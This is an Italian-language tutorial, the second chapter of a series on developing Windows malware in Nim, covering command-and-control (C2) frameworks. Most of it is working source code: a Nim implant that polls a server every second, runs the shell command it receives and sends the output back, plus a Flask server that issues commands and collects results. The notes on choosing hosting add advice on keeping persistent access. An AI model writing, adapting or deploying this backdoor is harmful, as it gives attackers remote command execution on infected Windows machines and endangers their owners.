# Capitolo 2: C2

Questo è il secondo capitolo di una serie dedicata al malware developing su Windows. Andremo a vedere e implementare tecniche per creare malware e nasconderlo. Verrà usato principalmente [Nim](https://nim-lang.org/) come linguaggio d programmazione (è sottointeso che dovresti conoscerne _almeno_ le basi e averci fatto un progetto sopra)

## Cos'è un C2?

"C2" sta per "Command & Control". ll nome deriva dall'industria militare, e porta la definizione di "insieme di procedure, protocolli, tecnologie e strumenti utilizzati per facilitare il comando, il controllo e il coordinamento delle operazioni o di altre organizzazioni complesse". In informatica, il concetto è lo stesso: un C2 framework è un sistema o un insieme di strumenti utilizzati da un attaccante informatico per comandare e controllare i dispositivi infettati da malware o altri strumenti malevoli.

## Cosa serve per a C2 framework?

In genere un C2 framework possiede le seguenti caratteristiche:

- Una backend e un payload proprio
- Un metodo di comunicazione fra i due (I\O)
- Una serie di azioni ulteriori disponibili alla backend per comandare il payload

## Approccio all'I\O

L'idea per questo progetto è semplice. Abbiamo un server http come backend con due routes:
- `/input`, route GET, dove in un file di testo apparirà il comando da eseguire dal parte del payload
- `/output`, route POST, che accetterà e immagazinerà in un file di testo tutto il contenuto a lei inviato

Da parte del payload invece, bisognerebbe avere un loop che ogni secondo controlla per aggiornamenti su `/input`, esegue il comando se è cambiato e non è una stringa vuota e manda l'output ad `/output`

## Il payload

Se implementiamo le idee discusse nel punto precedente, otteniamo un payload del genere:

    import os
    import httpclient
    import strutils
    import osproc
    
    var lastCommand = ""

    proc fetchCommand(url: string): string =
        let client = newHttpClient(url)
        let response = client.get(url)
        client.close()
        return response.body

    proc postResult(url: string, result: string) =
        let client = newHttpClient(url)
        var data = newMultipartData()
        data["outp"] = result
        var stuff = client.postContent(url, multipart=data)
        client.close()

    proc main() =
        const inputURL = "inserisci route input qui!"
        const outputURL = "inserisci route output qui!"

        while true:
            var newCommand = fetchCommand(inputURL)
            if newCommand != lastCommand and newCommand.strip != "":
                try:
                    let commandOut = execProcess(newCommand)
                    lastCommand = newCommand
                    postResult(outputURL, commandOut) 
                except:
                    echo("")
            sleep(1000)

    main()

Questo codice usa httpclient (al posto di httpbeast, che è unix-only) e definisce una funzione di input (`fetchCommand`) e di output (`postResult`). La funzione main invece crea un loop infinito ed esegue il concetto pensato prima. Il try/except loop serve a non far crashare il payload in caso di comando errato. Per non fare troppe richieste, mettiamo un limite di 1 secondo con `sleep(1000)`

## Il server

Il server si può implementare con un semplice script Python (e Flask):

    from flask import Flask, request, send_file

    app = Flask(__name__)

    @app.route('/input')
    def get_input():
        return send_file('command.txt')

    @app.route('/output', methods=['POST'])
    def store_output():
        data = request.get_data()
        with open('output.txt', 'wb') as f:
            f.write(data)
        return 'Data stored successfully'

    if __name__ == '__main__':
        app.run()

## Note

- Sconsiglio di usare servizi di tunneling (quali ngrok). Non c'è verso di modificare la variabli `inputURL` e `outputURL` dopo la compilazione, quindi se il tunnel ngrok si spegnesse per qualsiasi motivo si perde completamente accesso al payload, obliterando qualsiasi possibilità di persistenza.
- Quest'implementazione permette solo una pipeline di comandi (lo stesso comando verrà eseguito su tutti payload)